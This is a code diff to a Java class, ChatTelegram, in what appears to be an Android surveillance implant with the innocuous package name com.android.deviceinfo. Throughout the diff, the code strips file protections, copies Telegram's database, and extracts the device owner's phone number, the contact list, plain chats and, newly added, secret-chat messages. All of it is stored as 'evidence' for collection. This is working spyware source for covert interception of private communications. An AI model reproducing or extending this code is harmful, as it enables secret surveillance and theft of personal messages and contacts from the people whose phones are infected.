@@ -7,6 +7,7 @@ import java.nio.ByteBuffer;
 import java.nio.MappedByteBuffer;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.Hashtable;
 import java.util.List;
 import java.util.concurrent.Semaphore;
 
@@ -25,9 +26,11 @@ import android.util.Base64;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordHashPairVisitor;
+import com.android.deviceinfo.db.RecordHashtableIdVisitor;
 import com.android.deviceinfo.db.RecordStringVisitor;
 import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.file.Path;
+import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
 import com.android.m.M;
@@ -38,6 +41,7 @@ public class ChatTelegram extends SubModuleChat {
 		public int id;
 		public String name;
 		public String last_name;
+
 		public String getName() {
 			return name + " " + last_name;
 		}
@@ -60,7 +64,7 @@ public class ChatTelegram extends SubModuleChat {
 
 	private GenericSqliteHelper helper;
 
-	//private ByteBuffer in;
+	// private ByteBuffer in;
 
 	@Override
 	public int getProgramId() {
@@ -74,28 +78,23 @@ public class ChatTelegram extends SubModuleChat {
 
 	@Override
 	void notifyStopProgram(String processName) {
-		start();
+		updateHistory();
 	}
 
-	@Override
-	protected void start() {
-
+	private void updateHistory() {
 		if (!readChatSemaphore.tryAcquire()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readViberMessageHistory), semaphore red");
+				Check.log(TAG + " (updateHistory), semaphore red");
 			}
 			return;
 		}
-
 		try {
-
 			lastTelegram = markup.unserialize(new Long(0));
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (start), read lastTelegram: " + lastTelegram);
 			}
 
 			Path.unprotect(dbAccountFile, 3, true);
-			account = readMyPhoneNumber(dbAccountFile);
 
 			Path.unprotect(dbFile, 3, true);
 			Path.unprotect(dbFile + "*", true);
@@ -103,7 +102,7 @@ public class ChatTelegram extends SubModuleChat {
 			helper = GenericSqliteHelper.openCopy(dbFile);
 			helper.deleteAtEnd = false;
 
-			long lastmessage = readTelegramMessageHistory();
+			long lastmessage = readTelegramChatHistory();
 
 			if (lastmessage > lastTelegram) {
 				if (Cfg.DEBUG) {
@@ -116,7 +115,54 @@ public class ChatTelegram extends SubModuleChat {
 
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notifyStopProgram) Error: " + e);
+				Check.log(TAG + " (updateHistory) Error: " + e);
+			}
+		} finally {
+			readChatSemaphore.release();
+		}
+	}
+
+	@Override
+	protected void start() {
+
+		if (!readChatSemaphore.tryAcquire()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (start), semaphore red");
+			}
+			return;
+		}
+
+		try {
+
+			lastTelegram = markup.unserialize(new Long(0));
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (start), read lastTelegram: " + lastTelegram);
+			}
+
+			Path.unprotect(dbAccountFile, 3, true);
+
+			Path.unprotect(dbFile, 3, true);
+			Path.unprotect(dbFile + "*", true);
+
+			helper = GenericSqliteHelper.openCopy(dbFile);
+			helper.deleteAtEnd = false;
+
+			account = readAddressContacts();
+
+			long lastmessage = readTelegramChatHistory();
+
+			if (lastmessage > lastTelegram) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (start) serialize: %d", lastmessage);
+				}
+				markup.serialize(lastmessage);
+			}
+
+			helper.deleteDb();
+
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (start) Error: " + e);
 			}
 		} finally {
 			readChatSemaphore.release();
@@ -124,17 +170,58 @@ public class ChatTelegram extends SubModuleChat {
 
 	}
 
+	private Account readAddressContacts() throws SAXException, IOException, ParserConfigurationException {
+		account = readMyPhoneNumber(dbAccountFile);
+		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.TELEGRAM, account.getName());
+
+		if (ModuleAddressBook.getInstance() != null) {
+
+			RecordVisitor visitor = new RecordVisitor(null, null) {
+				@Override
+				public long cursor(Cursor cursor) {
+					int uid = cursor.getInt(0);
+					String name = cursor.getString(1);
+					byte[] data = cursor.getBlob(3);
+
+					ByteBuffer in = MappedByteBuffer.wrap(data);
+					Integer id = readInt32(in);
+					Integer id2 = readInt32(in);
+					String first_name = readString(in);
+					String last_name = readString(in);
+					String phone = readString(in);
+
+					Contact contact = new Contact(id.toString(), name, name, phone);
+					ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.TELEGRAM, contact);
+
+					return uid;
+				}
+			};
+
+			// RecordHashPairVisitor visitorHash = new
+			// RecordHashPairVisitor("uid", "name");
+			helper.traverseRecords("users", visitor);
+
+			// for (String key : visitorHash.getMap().keySet()) {
+			// String value = visitorHash.get(key);
+			// }
+
+		}
+
+		return account;
+	}
+
 	private Account readMyPhoneNumber(String filename) throws SAXException, IOException, ParserConfigurationException {
-		//<string name="user">7DUFct14eQIERWRkeQAAAAdXYXJsb2NrDDM5MzM4Njk1NTIwNAAAAOG6EU8/cIwAOWtIUzeXebw=</string>
-		//base64
+		// <string
+		// name="user">7DUFct14eQIERWRkeQAAAAdXYXJsb2NrDDM5MzM4Njk1NTIwNAAAAOG6EU8/cIwAOWtIUzeXebw=</string>
+		// base64
 		File file = new File(filename);
 		Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
 		doc.getDocumentElement().normalize();
 		NodeList stringNodes = doc.getElementsByTagName("string");
-		
+
 		String data64;
 		byte[] data = null;
-		
+
 		for (int i = 0; i < stringNodes.getLength(); i++) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readMyPhoneNumber), node: " + i);
@@ -155,11 +242,11 @@ public class ChatTelegram extends SubModuleChat {
 
 			}
 		}
-		
+
 		Account account = new Account();
-		ByteBuffer in = MappedByteBuffer.wrap(data); 
+		ByteBuffer in = MappedByteBuffer.wrap(data);
 		int con = readInt32(in);
-		account.id =  readInt32(in);
+		account.id = readInt32(in);
 		account.name = readString(in);
 		account.last_name = readString(in);
 
@@ -173,64 +260,38 @@ public class ChatTelegram extends SubModuleChat {
 		}
 	}
 
-	private long readTelegramMessageHistory() throws IOException {
+	private long readTelegramChatHistory() {
 
 		try {
 			Path.unprotect(dbFile, 3, true);
 			Path.unprotect(dbFile + "*", true);
 
-			GenericSqliteHelper helper =
-			GenericSqliteHelper.openCopy(dbFile);
+			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFile);
 			helper.deleteAtEnd = false;
-			//final ChatGroups groups = getTelegramGroups(helper);
 
-			String sqlquery = M.e("SELECT date, m.data, out, name  FROM messages as m  INNER JOIN users as u on m.uid = u.uid where date > ? order by date ");
+			long lastmessageS = readTelegramSecureChatHistory(helper);
+			long lastmessageP = readTelegramPlainChatHistory(helper);
+
+			return Math.max(lastmessageS, lastmessageP);
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readTelegramMessageHistory) Error: ", ex);
+			}
+		}
+
+		return 0;
+	}
+
+	private long readTelegramPlainChatHistory(GenericSqliteHelper helper) {
+
+		try {
+
+			String sqlquery = M
+					.e("SELECT date, m.data, out, name  FROM messages as m  INNER JOIN users as u on m.uid = u.uid where date > ? order by date ");
 
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-			RecordVisitor visitor = new RecordVisitor(null, null) {
-				@Override
-				public long cursor(Cursor cursor) {
-					long created_time = cursor.getLong(0);
-					Date date = new Date(created_time);
-
-					byte[] data = cursor.getBlob(1);
-					boolean incoming = cursor.getInt(2) == 0;
-					// localtime or gmt? should be converted to gmt
-					String name = cursor.getString(3);
-
-					String to, from;
-					if(incoming){
-						to = account.getName();
-						from = name;
-					}else{
-						to = name;
-						from = account.getName();
-					}
-					
-					ByteBuffer in = MappedByteBuffer.wrap(data); 
-					int id = readInt32(in);
-					int fwd_from_id = readInt32(in);
-					int fwd_date = readInt32(in);
-					int from_id = readInt32(in);
-					int to_id = readInt32(in);
-					boolean out = readBool(in);
-					boolean unread = readBool(in);
-					int m_date = readInt32(in);
-					String content = readString(in);
-					
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", id,
-								date.toLocaleString(), from, to, content);
-					}
-
-					MessageChat message = new MessageChat(PROGRAM, date, from, to, content,
-							incoming);
-					messages.add(message);
-					
-					return created_time;
-				}
-			};
+			MessageRecordVisitor visitor = new MessageRecordVisitor(messages);
 
 			helper.deleteAtEnd = true;
 			long lastmessage = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastTelegram) }, visitor);
@@ -247,6 +308,71 @@ public class ChatTelegram extends SubModuleChat {
 		return lastTelegram;
 
 	}
+
+	private long readTelegramSecureChatHistory(GenericSqliteHelper helper) {
+
+		String sqlquery = M
+				.e("SELECT  m.date, m.data, m.out, q.name FROM enc_chats as q INNER JOIN users as u ON q.user = u.uid INNER JOIN messages as m ON (q.uid << 32) = m.uid WHERE m.date > ? order by m.date");
+
+		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
+
+		MessageRecordVisitor visitor = new MessageRecordVisitor(messages);
+
+		helper.deleteAtEnd = true;
+		long lastmessage = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastTelegram) }, visitor);
+
+		getModule().saveEvidence(messages);
+		return lastmessage;
+	}
+
+	class MessageRecordVisitor extends RecordVisitor {
+		private ArrayList<MessageChat> messages;
+
+		public MessageRecordVisitor(ArrayList<MessageChat> messages) {
+			this.messages = messages;
+		}
+
+		@Override
+		public long cursor(Cursor cursor) {
+			long created_time = cursor.getLong(0);
+			Date date = new Date(created_time * 1000);
+
+			byte[] data = cursor.getBlob(1);
+			boolean incoming = cursor.getInt(2) == 0;
+			// localtime or gmt? should be converted to gmt
+			String name = cursor.getString(3);
+
+			String to, from;
+			if (incoming) {
+				to = account.getName();
+				from = name;
+			} else {
+				to = name;
+				from = account.getName();
+			}
+
+			ByteBuffer in = MappedByteBuffer.wrap(data);
+			int id = readInt32(in);
+			int fwd_from_id = readInt32(in);
+			int fwd_date = readInt32(in);
+			int from_id = readInt32(in);
+			int to_id = readInt32(in);
+			boolean out = readBool(in);
+			boolean unread = readBool(in);
+			int m_date = readInt32(in);
+			String content = readString(in);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readTelegramMessageHistory) %s\n%s, %s -> %s: %s ", id, date.toLocaleString(), from,
+						to, content);
+			}
+
+			MessageChat message = new MessageChat(PROGRAM, date, from, to, content, incoming);
+			messages.add(message);
+
+			return created_time;
+		}
+	};
 
 	private ChatGroups getTelegramGroups(GenericSqliteHelper helper) {
 		// SQLiteDatabase db = helper.getReadableDatabase();
@@ -271,9 +397,8 @@ public class ChatTelegram extends SubModuleChat {
 			}
 
 			private void unserializeData(byte[] data) {
-				ByteBuffer in = MappedByteBuffer.wrap(data); 
-				
-				
+				ByteBuffer in = MappedByteBuffer.wrap(data);
+
 			}
 		};
 
@@ -315,14 +440,27 @@ public class ChatTelegram extends SubModuleChat {
 	}
 
 	public int readInt32(ByteBuffer in) {
-		// FileLog.d("olli-deserialize","readInt32 boolean? " + error);
+
 		try {
 			int i = 0;
 			for (int j = 0; j < 4; j++) {
 				i |= (in.get() << (j * 8));
 			}
 
-			// FileLog.d("olli-deserialize","readInt32 returning " + i);
+			return i;
+		} catch (Exception x) {
+
+		}
+		return 0;
+	}
+
+	public long readInt64(ByteBuffer in) {
+		try {
+			long i = 0;
+			for (int j = 0; j < 8; j++) {
+				i |= ((long) in.get() << (j * 8));
+			}
+
 			return i;
 		} catch (Exception x) {
 
